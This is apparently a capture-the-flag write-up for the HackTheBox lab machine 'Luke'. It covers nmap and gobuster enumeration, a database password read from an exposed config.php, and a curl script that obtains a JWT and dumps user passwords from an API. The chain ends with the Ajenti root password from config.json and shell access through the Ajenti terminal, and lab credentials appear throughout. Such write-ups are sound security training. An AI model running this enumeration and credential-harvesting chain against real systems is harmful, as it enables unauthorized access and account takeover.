---
layout: post
title: HackTheBox Luke
---

Luke was a very interesting box as you had to use no exploits to complete the box.

I start with a standard nmap scan to see what is running.

```
nmap -sV -sC -oA nmap 10.10.10.137
Nmap 7.70 scan initiated Sat Jun 29 08:13:13 2019 as: nmap -sV -sC -oA nmap 10.10.10.137
Nmap scan report for 10.10.10.137
Host is up (0.24s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 29 08:16:35 2019 -- 1 IP address (1 host up) scanned in 201.50 seconds
```

http://10.10.10.137/

We have a simple bootstrap website.

http://10.10.10.137:3000/

On port 3000 we're given some JSON data.

```
success	false
message	"Auth token is not supplied"
```

http://10.10.10.137:8000/

We have an ajenti login panel

Let's try get in via the ftp port with Ncftp.

```
Ncftp 10.10.10.137
Cd webapp
Cat for_chihiro.txt

Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry  
```
Nothing too interesting but maybe we can use some of those as usernames.

Next I run gobuster.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.137/ -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.137/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/09/15 03:56:48 Starting gobuster
===============================================================
/login.php (Status: 200)
/member (Status: 301)
/management (Status: 401)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/LICENSE (Status: 200)


```

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.137:3000/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.137:3000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/15 00:19:09 Starting gobuster
===============================================================
/login (Status: 200)
/users (Status: 200)
/Login (Status: 200)
/Users (Status: 200)

```

We find a config.php file which contains a password and username.

http://10.10.10.137/config.php
```
﻿$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error); 
```
https://medium.com/@nieldw/using-curl-to-authenticate-with-jwt-bearer-tokens-55b7fac506bd
```
#!/bin/bash
TOKEN=$(curl -v -H "Content-Type: application/json" -X POST -d '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' http://10.10.10.137:3000/login | jq -r '.token')

curl -H 'Accept: application/json' -H "Authorization: Bearer ${TOKEN}" http://10.10.10.137:3000/users
```
```
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```
Now we have a list of user names and id's, by modifying 10.10.10.137:3000/users/ to have the user name we have found at the end of the url.
```
users/admin
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}

users/derry
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}

users/yuri
{"name":"Yuri","password":"bet@tester87"}

users/dory
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```
Now we have a list of usernames and passwords we can see where they work.

10.10.10.137/management

We try logging into the management login.

{"name":"Yuri","password":"bet@tester87"}

http://10.10.10.137/management/config.json
```
{
    "users": {
        "root": {
            "configs": {
                "ajenti.plugins.notepad.notepad.Notepad": "{\"bookmarks\": [], \"root\": \"/\"}", 
                "ajenti.plugins.terminal.main.Terminals": "{\"shell\": \"sh -c $SHELL || sh\"}", 
                "ajenti.plugins.elements.ipmap.ElementsIPMapper": "{\"users\": {}}", 
                "ajenti.plugins.munin.client.MuninClient": "{\"username\": \"username\", \"prefix\": \"http://localhost:8080/munin\", \"password\": \"123\"}", 
                "ajenti.plugins.dashboard.dash.Dash": "{\"widgets\": [{\"index\": 0, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.MemoryWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.SwapWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.dashboard.welcome.WelcomeWidget\"}, {\"index\": 0, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.uptime.UptimeWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.power.power.PowerWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.cpu.CPUWidget\"}]}", 
                "ajenti.plugins.elements.shaper.main.Shaper": "{\"rules\": []}", 
                "ajenti.plugins.ajenti_org.main.AjentiOrgReporter": "{\"key\": null}", 
                "ajenti.plugins.logs.main.Logs": "{\"root\": \"/var/log\"}", 
                "ajenti.plugins.mysql.api.MySQLDB": "{\"password\": \"\", \"user\": \"root\", \"hostname\": \"localhost\"}", 
                "ajenti.plugins.fm.fm.FileManager": "{\"root\": \"/\"}", 
                "ajenti.plugins.tasks.manager.TaskManager": "{\"task_definitions\": []}", 
                "ajenti.users.UserManager": "{\"sync-provider\": \"\"}", 
                "ajenti.usersync.adsync.ActiveDirectorySyncProvider": "{\"domain\": \"DOMAIN\", \"password\": \"\", \"user\": \"Administrator\", \"base\": \"cn=Users,dc=DOMAIN\", \"address\": \"localhost\"}", 
                "ajenti.plugins.elements.usermgr.ElementsUserManager": "{\"groups\": []}", 
                "ajenti.plugins.elements.projects.main.ElementsProjectManager": "{\"projects\": \"KGxwMQou\\n\"}"
            }, 
            "password": "KpMasng6S5EtTy9Z", 
            "permissions": []
        }
    }, 
    "language": "", 
    "bind": {
        "host": "0.0.0.0", 
        "port": 8000
    }, 
    "enable_feedback": true, 
    "ssl": {
        "enable": false, 
        "certificate_path": ""
    }, 
    "authentication": true, 
    "installation_id": 12354
}
```
We find a password

KpMasng6S5EtTy9Z

http://10.10.10.137:8000/ 

We log in with 

root KpMasng6S5EtTy9Z

Next we select terminal from the side and create a new one.

```
cd root
cat root.txt
cd home
cd derry
cat user.txt
```
